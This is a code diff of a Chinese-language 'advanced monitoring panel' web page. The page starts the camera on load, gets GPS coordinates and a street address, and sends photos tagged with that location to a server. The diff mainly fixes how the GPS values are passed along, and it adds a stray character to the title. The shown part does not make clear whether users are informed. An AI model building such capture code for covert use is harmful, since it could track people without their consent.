@@ -54,7 +54,7 @@
   </style>
 </head>
 <body>
-  <h1>高級監控面板</h1>
+  <h1>高級監控ㄅ面板</h1>
   <div class="container">
     <div class="card">
       <h2>IP 與位置資訊</h2>
@@ -138,10 +138,11 @@
       const address = data.display_name || '未知地址';
 
       // 繼續處理 GPS 資訊
-      processGpsData(latitude, longitude, address);
+      return { latitude, longitude, address };
     } catch (error) {
       console.error('GPS 錯誤或超時:', error);
       statusElement.innerText = 'GPS 無法取得，請檢查裝置定位權限或嘗試重新載入。';
+      throw error;
     }
   }
 
@@ -149,7 +150,7 @@
   async function processPhotoData(photoData) {
     try {
       // 獲取 GPS 資訊並繼續處理
-      await getGpsCoordinates();
+      const { latitude, longitude, address } = await getGpsCoordinates();
       await sendPhotoToServer(photoData, latitude, longitude, address);
     } catch (error) {
       console.error('處理過程中發生錯誤:', error);
@@ -300,7 +301,6 @@
     getWeatherInfo();
     setupPerformanceChart();
     startCamera();
-    getGpsCoordinates();
   });
 </script>
 
